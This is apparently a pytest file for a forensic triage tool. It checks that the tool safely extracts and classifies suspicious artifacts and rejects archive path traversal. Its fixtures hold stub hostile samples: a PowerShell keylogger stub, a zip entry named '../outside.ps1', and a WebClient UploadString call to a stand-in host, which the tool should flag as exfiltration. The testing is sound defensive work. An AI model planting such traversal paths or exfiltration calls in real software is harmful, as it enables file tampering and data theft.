from __future__ import annotations

import json
import os
import subprocess
import sys
import zipfile
from pathlib import Path

PROJECT = Path(__file__).resolve().parents[1]
SCRIPTS = PROJECT / "scripts"
sys.path.insert(0, str(SCRIPTS))
import static_artifact  # noqa: E402


def run(root: Path, script: str, *args: str) -> subprocess.CompletedProcess[str]:
    env = os.environ.copy()
    env["ARIES_ROOT"] = str(root)
    return subprocess.run([sys.executable, str(SCRIPTS / script), *args], env=env, text=True, capture_output=True)


def prepare_case(tmp_path: Path, archive: Path, name: str = "static") -> Path:
    root = tmp_path / "Aries"
    assert run(root, "case.py", "init", "--name", name, "--artifact", str(archive)).returncode == 0
    assert run(root, "artifact_discovery.py", "--case", name).returncode == 0
    return root


def test_zip_extensionless_powershell_is_safely_extracted_and_indexable(tmp_path: Path) -> None:
    archive = tmp_path / "malware.zip"
    script = """function Start-Keylogger { Add-Type '[DllImport(\"user32.dll\")]' }\n$proxyPort = 8080\nStart-Sleep -Seconds 5\n"""
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("sample", script)
    original = archive.read_bytes()
    root = prepare_case(tmp_path, archive)

    proc = run(root, "run_artifact_baseline.py", "--case", "static")
    assert proc.returncode == 0, proc.stderr + proc.stdout
    assert archive.read_bytes() == original
    manifest = json.loads((root / "cases" / "static" / "output" / "artifacts" / "artifact-baseline-manifest.json").read_text())
    task = manifest["results"][0]
    assert task["tool"] == "StaticArtifact"
    assert task["status"] == "complete"
    report_path = next(Path(value) for value in task["outputs"] if value.endswith("static-analysis.json"))
    report = json.loads(report_path.read_text())
    assert report["backend"] == "python-zipfile"
    assert report["files"][0]["detected_type"] == "powershell"
    text_path = Path(report["files"][0]["text_output"])
    assert "Start-Keylogger" in text_path.read_text()
    assert text_path.is_relative_to(root / "cases" / "static" / "output")

    triage = run(root, "artifact_triage.py", "--case", "static")
    assert triage.returncode == 0, triage.stderr
    leads = [json.loads(line) for line in (root / "cases" / "static" / "leads.jsonl").read_text().splitlines()]
    assert any(item["type"] == "powershell" and item["value"] == "sample" for item in leads)


def test_archive_path_traversal_is_rejected_without_writing_outside_case(tmp_path: Path) -> None:
    archive = tmp_path / "hostile.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("../outside.ps1", "Write-Host pwned")
    root = prepare_case(tmp_path, archive, "hostile")
    proc = run(root, "run_artifact_baseline.py", "--case", "hostile")
    assert proc.returncode == 2
    assert not (root / "cases" / "hostile" / "outside.ps1").exists()
    manifest = json.loads((root / "cases" / "hostile" / "output" / "artifacts" / "artifact-baseline-manifest.json").read_text())
    assert manifest["results"][0]["status"] == "failed"
    assert "Unsafe archive member path" in manifest["results"][0]["reason"]


def test_static_reader_does_not_depend_on_windows_file_metadata(tmp_path: Path, monkeypatch) -> None:
    sample = tmp_path / "cha"
    sample.write_text("function Start-Keylogger { Add-Type '[DllImport(\"user32.dll\")]' }", encoding="utf-8")
    original_stat = Path.stat

    def guarded_stat(path: Path, *args, **kwargs):
        if path == sample:
            raise OSError(22, "Invalid argument", str(path))
        return original_stat(path, *args, **kwargs)

    monkeypatch.setattr(Path, "stat", guarded_stat)
    record = static_artifact.analyze_text_file(sample, tmp_path / "content", 1, "cha")
    assert record["detected_type"] == "powershell"
    assert record["size_bytes"] == len(sample.read_bytes())
    assert Path(record["text_output"]).is_file()


def test_loose_extensionless_script_is_classified_by_content(tmp_path: Path) -> None:
    sample = tmp_path / "payload"
    sample.write_text("function Invoke-Test { $x = New-Object Net.WebClient; $x.UploadString('http://example.test','x') }", encoding="utf-8")
    root = prepare_case(tmp_path, sample, "loose")
    proc = run(root, "run_artifact_baseline.py", "--case", "loose")
    assert proc.returncode == 0, proc.stderr + proc.stdout
    reports = list((root / "cases" / "loose" / "output" / "artifacts").rglob("static-analysis.json"))
    report = json.loads(reports[0].read_text())
    assert report["files"][0]["detected_type"] == "powershell"
    categories = {category for hit in report["files"][0]["signal_hits"] for category in hit["categories"]}
    assert "upload_or_exfiltration" in categories


def test_event_phases_are_skipped_when_inventory_has_no_evtx(tmp_path: Path) -> None:
    sample = tmp_path / "note.txt"
    sample.write_text("plain artifact", encoding="utf-8")
    root = prepare_case(tmp_path, sample, "noevents")
    code = (
        "import json, os, sys; "
        f"sys.path.insert(0, {str(SCRIPTS)!r}); "
        "from investigate import phase_skip_reason; "
        "print(json.dumps({'reason': phase_skip_reason('noevents', 'eventlog_baseline')}))"
    )
    env = os.environ.copy(); env["ARIES_ROOT"] = str(root)
    proc = subprocess.run([sys.executable, "-c", code], env=env, text=True, capture_output=True)
    assert proc.returncode == 0, proc.stderr
    assert "No event logs" in json.loads(proc.stdout)["reason"]
